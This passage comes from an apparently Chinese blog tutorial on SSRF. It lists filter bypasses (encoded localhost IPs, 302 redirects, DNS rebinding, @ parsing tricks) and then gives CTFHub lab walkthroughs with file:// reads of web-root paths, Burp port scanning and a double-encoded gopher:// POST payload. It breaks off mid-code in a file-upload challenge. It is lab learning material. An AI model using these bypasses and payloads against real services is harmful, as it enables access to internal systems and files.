<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529204411015.png" alt="image-20240529204411015"></p>
<p>原始：(点分十进制)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>进行进制转换，例如：</p>
<h4 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://017700000001/flag.php</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0177.0000.0001/flag.php</span><br></pre></td></tr></table></figure>

<h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0x7F.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0x7F.0x00.0x00.0x01/flag.php</span><br></pre></td></tr></table></figure>

<h4 id="十进制-连续"><a href="#十进制-连续" class="headerlink" title="十进制(连续)"></a>十进制(连续)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2130706433/flag.php</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>小结：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529205017384.png" alt="image-20240529205017384"></p>
<h3 id="302重定向"><a href="#302重定向" class="headerlink" title="302重定向"></a>302重定向</h3><p>302重定向：针对<strong>私网地址被限制</strong>的情况</p>
<p><strong>原理：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530170432291.png" alt="image-20240530170432291"></p>
<ul>
<li>构建302重定向代码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530170641308.png" alt="image-20240530170641308"></p>
<p>注：不能使用python</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530170659892.png" alt="image-20240530170659892"></p>
<ul>
<li>尝试用内网IP，失败</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530170902171.png" alt="image-20240530170902171"></p>
<ul>
<li>改用公网IP，成功</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530170834395.png" alt="image-20240530170834395"></p>
<h3 id="DNS重绑定绕过"><a href="#DNS重绑定绕过" class="headerlink" title="DNS重绑定绕过"></a>DNS重绑定绕过</h3><p>这里我们先来提一下针对<strong>SSRF漏洞</strong>的<strong>防御</strong></p>
<ol>
<li>解析目标的URL，获取其Host</li>
<li>解析Host，获取Host指向的IP地址</li>
<li>检查IP地址是否为<strong>内网地址</strong></li>
<li>请求URL</li>
<li>如果有跳转，拿出跳转URL，执行1</li>
</ol>
<p>这些防御可以有效地限制：</p>
<ul>
<li>直接<strong>访问内网IP</strong></li>
<li><strong>IP进制转换</strong></li>
<li><strong>302跳转</strong></li>
<li>xip.io&#x2F;xip.name 以及短链接变换等URL变形</li>
<li>畸形URL</li>
<li>iframe攻击</li>
</ul>
<p>因此，<strong>针对这种防御</strong>，我们就可以使用<strong>DNS Rebinding Attack（DNS重绑定攻击）</strong></p>
<h4 id="DNS-重绑定攻击的原理"><a href="#DNS-重绑定攻击的原理" class="headerlink" title="DNS 重绑定攻击的原理"></a>DNS 重绑定攻击的原理</h4><p>先来看看SSRF的<strong>防御模式</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530172204403.png" alt="image-20240530172204403"></p>
<blockquote>
<p>第一次DNS解析:是对<strong>URL</strong>的host进行DNS解析</p>
<p>第二次DNS解析:使用<strong>CURL</strong>发包的时候进行解析</p>
<p>利用两次DNS解析的时间差进行绕过。</p>
</blockquote>
<p><strong>攻击原理</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530172427304.png" alt="image-20240530172427304"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530172920777.png" alt="image-20240530172920777"></p>
<ul>
<li><strong>网站：</strong>提供TTL为0的解析</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lock.cmpxchg8b.com/rebinder.html</span><br></pre></td></tr></table></figure>

<ul>
<li>生成DNS解析的域名</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530172637356.png" alt="image-20240530172637356"></p>
<ul>
<li>用生成的域名进行重绑定</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530172723805.png" alt="image-20240530172723805"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530172733578.png" alt="image-20240530172733578"></p>
<p><strong>小结：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240530172811215.png" alt="image-20240530172811215"></p>
<h3 id="利用-进行绕过"><a href="#利用-进行绕过" class="headerlink" title="利用@进行绕过"></a>利用@进行绕过</h3><ul>
<li>限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</li>
</ul>
<blockquote>
<p>可以尝试采用http基本身份认证的方式绕过<br>如：<a target="_blank" rel="noopener" href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</a><br>在PHP的parse_url中会识别<a target="_blank" rel="noopener" href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p>
</blockquote>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>原理：</p>
<p><strong>@前面会被解析成用户名，后面是访问地址</strong></p>
<h1 id="SSRF靶场"><a href="#SSRF靶场" class="headerlink" title="SSRF靶场"></a>SSRF靶场</h1><h2 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><ul>
<li>题目要求：</li>
</ul>
<p><strong>访问位于127.0.0.1的flag.php</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601182524655.png" alt="image-20240601182524655"></p>
<ul>
<li>打开网址</li>
<li>一片空白，因为还没有输入URL</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601182629358.png" alt="image-20240601182629358"></p>
<ul>
<li>手敲URL，访问flag.php</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601182740339.png" alt="image-20240601182740339"></p>
<ul>
<li>拿到flag</li>
</ul>
<h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><ul>
<li>题目要求：</li>
</ul>
<p><strong>读取Web目录下的flag.php</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601184422655.png" alt="image-20240601184422655"></p>
<ul>
<li>进入题目环境</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601184353100.png" alt="image-20240601184353100"></p>
<p>伪协议读取文件，于是想到用<strong>file伪协议</strong></p>
<h4 id="file伪协议解题"><a href="#file伪协议解题" class="headerlink" title="file伪协议解题"></a>file伪协议解题</h4><ul>
<li><p>起初对：“<strong>Web目录</strong>”有误解</p>
</li>
<li><p>构造了<code>file:///etc/flag.php</code>还有<code>file:///web/flag.php</code>,但发现都不行</p>
</li>
</ul>
<p>这里请教了一下狗屁通</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601184828963.png" alt="image-20240601184828963"></p>
<ul>
<li>因此，应该构造的payload应为：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601185022253.png" alt="image-20240601185022253"></p>
<ul>
<li><p>有回显，但没有flag，查看源代码看看</p>
</li>
<li><p>拿到flag</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601185100686.png" alt="image-20240601185100686"></p>
<p>补充：</p>
<h4 id="Web目录"><a href="#Web目录" class="headerlink" title="Web目录"></a>Web目录</h4><p>假设你要读取Web服务器上的<code>flag.php</code>文件，可以从以下路径尝试：</p>
<ol>
<li><p><strong>Apache (Linux)</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/html/flag.php</span><br><span class="line">file:///var/www/flag.php</span><br><span class="line">file:///usr/local/apache2/htdocs/flag.php</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Nginx (Linux)</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///usr/share/nginx/html/flag.php</span><br><span class="line">file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>XAMPP (Windows)</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/xampp/htdocs/flag.php</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>IIS (Windows)</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/inetpub/wwwroot/flag.php</span><br></pre></td></tr></table></figure></li>
</ol>
<p>通过尝试这些路径，就可以逐步确定目标Web目录的具体路径。</p>
<p><strong>注</strong>解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>/var/www/html</code> 是 Unix&#x2F;Linux 系统中一个常见的目录路径。这个路径通常用于存放 <strong>Web 服务器</strong>（如 Apache 或 Nginx）托管的静态文件和动态脚本。具体解释如下：</p>
</blockquote>
<ul>
<li><code>/var</code>：这个目录用于存放可变数据文件，即那些经常发生变化的文件。包括系统日志文件、包管理系统的缓存、临时文件等等。</li>
<li><code>/var/www</code>：这是 Web 服务器的默认根目录，通常包含 Web 服务器可以访问的所有网站文件。</li>
<li><code>/var/www/html</code>：这是 Web 服务器的默认文档根目录，通常是存放网站的主要内容，包括 HTML 文件、CSS 文件、JavaScript 文件以及 PHP 脚本文件等。</li>
</ul>
<p>所以，<code>file:///var/www/html/flag.php</code> 这个 URL 表示你在本地文件系统中访问位于 <code>/var/www/html</code> 目录下的 <code>flag.php</code> 文件。这通常是一个 PHP 脚本文件，Web 服务器会通过解析这个文件来生成动态网页内容并返回给客户端。</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul>
<li>题目要求</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601192656410.png" alt="image-20240601192656410"></p>
<ul>
<li><p>用burp suite扫描端口号，从8000到9000</p>
</li>
<li><p>先构造出一个payload：URL&#x3D;<code>127.0.0.1：8000</code></p>
</li>
<li><p>用bp抓包，发送到intruder</p>
</li>
<li><p>添加$</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601192842586.png" alt="image-20240601192842586"></p>
<ul>
<li>用数值爆破</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601192905166.png" alt="image-20240601192905166"></p>
<ul>
<li>再根据长度找到对应端口即可</li>
</ul>
<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><ul>
<li>本题考查POST请求</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601222308573.png" alt="image-20240601222308573"></p>
<ul>
<li>首先访问目标地址发现是空白页面；网页导航栏中有url的参数信息，说明肯定是有<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ssrf&spm=1001.2101.3001.7020">ssrf</a>信息的</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601222447023.png" alt="image-20240601222447023"></p>
<h4 id="尝试访问127-0-0-1-flag-php"><a href="#尝试访问127-0-0-1-flag-php" class="headerlink" title="尝试访问127.0.0.1/flag.php"></a>尝试访问<code>127.0.0.1/flag.php</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601222548715.png" alt="image-20240601222548715"></p>
<ul>
<li>查看源代码,可以发现Key的值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=baab86e14b9c9109be8f54a01411be26</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601222553706.png" alt="image-20240601222553706"></p>
<h4 id="分别查看index-php和flag-php"><a href="#分别查看index-php和flag-php" class="headerlink" title="分别查看index.php和flag.php"></a>分别查看index.php和flag.php</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601222729852.png" alt="image-20240601222729852"></p>
<ul>
<li>flag.php</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601222757713.png" alt="image-20240601222757713"></p>
<ul>
<li>可见：要POST上传key的值才能拿到flag</li>
<li>想到用gopher伪协议上传</li>
</ul>
<p>POST传参了key</p>
<p>$_SERVER[‘SERVER_ADDR ‘ ]：当前运行脚本所在的服务器（非本地）的 IP 地址。  </p>
<p>所以在flag.php传入key值返回flag，<strong>index.php</strong>可以利用<strong>curl</strong>传url</p>
<p>故用<strong>gopher</strong>协议在index.php中构造post请求包往flag.php传key值，从而获得flag</p>
<p><strong>构造 Gopher协议所需的 POST请求：</strong></p>
<p>POST包必须包含的四个参数：</p>
<ul>
<li>Content-Type</li>
<li>Content-Length（key的长度）</li>
<li>host</li>
<li>post</li>
</ul>
<h4 id="利用gopher伪协议传参"><a href="#利用gopher伪协议传参" class="headerlink" title="利用gopher伪协议传参"></a>利用gopher伪协议传参</h4><ul>
<li>先随便输入表单值，抓包</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601223007091.png" alt="image-20240601223007091"></p>
<ul>
<li>从数据包里提取，构造代码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601223108343.png" alt="image-20240601223108343"></p>
<ul>
<li>构造出payload</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601223201227.png" alt="image-20240601223201227"></p>
<ul>
<li><p>将其进行两次URL编码（因为浏览器会自动进行urldecode解析且到达目的地之前需要两次url解码：中转网站解析+目标解析）</p>
</li>
<li><p>在线编码地址：<a target="_blank" rel="noopener" href="http://www.jsons.cn/unicode">在线Unicode编码转换-Unicode和ASCII在线互转-中文转Unicode工具 (jsons.cn)</a></p>
<p>将上面的文本复制到加密选项中；加密结果如下</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601223308461.png" alt="image-20240601223308461"></p>
<ul>
<li>将%0A替换成%0D%A</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601223349396.png" alt="image-20240601223349396"></p>
<ul>
<li>进行第二次URL编码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601223435204.png" alt="image-20240601223435204"></p>
<ul>
<li>拿到编码后的payload</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dbaab86e14b9c9109be8f54a01411be26</span><br></pre></td></tr></table></figure>

<ul>
<li>gopher伪协议的格式：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_</span><br></pre></td></tr></table></figure>

<ul>
<li>完整的payload</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dbaab86e14b9c9109be8f54a01411be26</span><br></pre></td></tr></table></figure>

<ul>
<li>访问完整的URL</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-15abad72ec7515ae.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dbaab86e14b9c9109be8f54a01411be26</span><br></pre></td></tr></table></figure>

<ul>
<li>最终拿到flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601223929796.png" alt="image-20240601223929796"></p>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>法一：将原始payload进行<strong>部分URl编码</strong></p>
<p>法二：将原始payload全部进行URL编码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240601222010719.png" alt="image-20240601222010719"></p>
<ul>
<li>经过检查：</li>
</ul>
<p>区别：</p>
<ul>
<li><strong>Host后没加上空格</strong>和key的<strong>k用的是小写</strong>   这两个不同均不影响payload的作用</li>
<li>真正影响的是<code>urlencod</code>没加上<strong>ed</strong>，应为<code>urlencoded</code></li>
</ul>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ul>
<li>题目要求上传一个文件到flag.php</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602192049162.png" alt="image-20240602192049162"></p>
<ul>
<li>进入网页，为空白</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602192139085.png" alt="image-20240602192139085"></p>
<h4 id="尝试访问127-0-0-1-flag-php-1"><a href="#尝试访问127-0-0-1-flag-php-1" class="headerlink" title="尝试访问127.0.0.1/flag.php"></a>尝试访问<code>127.0.0.1/flag.php</code></h4><ul>
<li>发现有一个文件上传的地方</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602192210353.png" alt="image-20240602192210353"></p>
<ul>
<li>但是没有提交按钮</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602192640903.png" alt="image-20240602192640903"></p>
<p><strong>查看index.php</strong></p>
<ul>
<li>与前一题基本一样</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602192707421.png" alt="image-20240602192707421"></p>
<h4 id="查看flag-php"><a href="#查看flag-php" class="headerlink" title="查看flag.php"></a>查看flag.php</h4><ul>
<li>访问并且查看源代码，得到以下代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != 